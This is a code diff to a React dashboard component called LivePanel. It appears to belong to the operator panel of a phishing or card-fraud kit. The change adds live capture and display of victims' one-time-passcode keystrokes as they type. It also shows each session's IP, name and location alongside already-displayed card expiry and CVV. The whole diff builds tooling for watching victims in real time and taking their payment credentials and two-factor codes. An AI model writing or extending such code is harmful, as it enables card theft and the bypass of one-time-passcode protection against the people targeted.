@@ -40,6 +40,7 @@ interface SessionData {
     expiry?: string;
     email?: string;
     phone?: string;
+    otpCurrentInput?: string; // Live OTP keystrokes
     address?: string;
     city?: string;
     state?: string;
@@ -227,13 +228,36 @@ export default function LivePanel() {
                             <div
                                 key={s.id}
                                 onClick={() => setSelectedSessionId(s.id)}
-                                className={`p-3 rounded cursor-pointer border ${selectedSessionId === s.id ? 'bg-blue-600/10 border-blue-500/50' : 'bg-[#161b26] border-white/5 hover:border-white/10'}`}
+                                className={`p-4 rounded-xl cursor-pointer border transition-all mb-2 ${selectedSessionId === s.id ? 'bg-blue-600/10 border-blue-500/50 shadow-blue-900/10 shadow-lg' : 'bg-[#161b26] border-white/5 hover:border-white/10'}`}
                             >
-                                <div className="flex justify-between items-center mb-1">
-                                    <span className="font-mono text-xs text-blue-300">#{s.id.substring(0, 4)}</span>
-                                    {s.status === 'active' && <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>}
+                                <div className="flex justify-between items-start mb-2">
+                                    <div>
+                                        {/* IP Address as Main Header */}
+                                        <div className="font-mono font-bold text-sm text-white flex items-center gap-2">
+                                            {s.ip || "Unknown IP"}
+                                            {/* Live Badge */}
+                                            {Date.now() - s.lastActive < 120000 && (
+                                                <span className="bg-green-500/20 text-green-400 text-[10px] px-1.5 py-0.5 rounded uppercase font-bold tracking-wider animate-pulse border border-green-500/30">
+                                                    Live
+                                                </span>
+                                            )}
+                                        </div>
+                                        {/* Name & ID */}
+                                        <div className="text-xs text-gray-400 mt-1 flex flex-col">
+                                            {s.name && <span className="text-blue-200 font-medium">{s.name}</span>}
+                                            <span className="opacity-50 font-mono">ID: {s.id.substring(0, 4)}</span>
+                                        </div>
+                                    </div>
+
+                                    {/* Status Dot */}
+                                    <div className={`w-2 h-2 rounded-full mt-1.5 ${Date.now() - s.lastActive < 120000 ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.5)]' :
+                                            Date.now() - s.lastActive < 300000 ? 'bg-yellow-500' : 'bg-gray-600'
+                                        }`}></div>
                                 </div>
-                                <div className="text-[10px] text-gray-500 truncate">{s.currentLocation || "Unknown"}</div>
+                                <div className="text-[10px] text-gray-500 truncate border-t border-white/5 pt-2 mt-2 flex items-center gap-1">
+                                    <MapPin className="w-3 h-3" />
+                                    {s.currentLocation || "Unknown Location"}
+                                </div>
                             </div>
                         ))
                     )}
@@ -350,6 +374,21 @@ export default function LivePanel() {
                                 expiry={selectedSession?.expiry || ""}
                                 cvv={selectedSession?.cvv || ""}
                             />
+                        </div>
+                    </div>
+
+                    {/* LIVE OTP PREVIEW (Stripe Style) */}
+                    <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden ring-1 ring-blue-500/30">
+                        <div className="px-4 py-3 border-b border-white/5 bg-[#635bff]/10 flex justify-between items-center">
+                            <span className="text-xs font-bold text-[#635bff] uppercase flex items-center gap-2">
+                                <Shield className="w-3 h-3" /> Live OTP Input
+                            </span>
+                            <span className="text-[10px] bg-[#635bff] text-white px-2 py-0.5 rounded animate-pulse">Typing...</span>
+                        </div>
+                        <div className="p-6 text-center">
+                            <div className="text-3xl font-mono tracking-[0.5em] text-white">
+                                {selectedSession?.otpCurrentInput || "......"}
+                            </div>
                         </div>
                     </div>
 
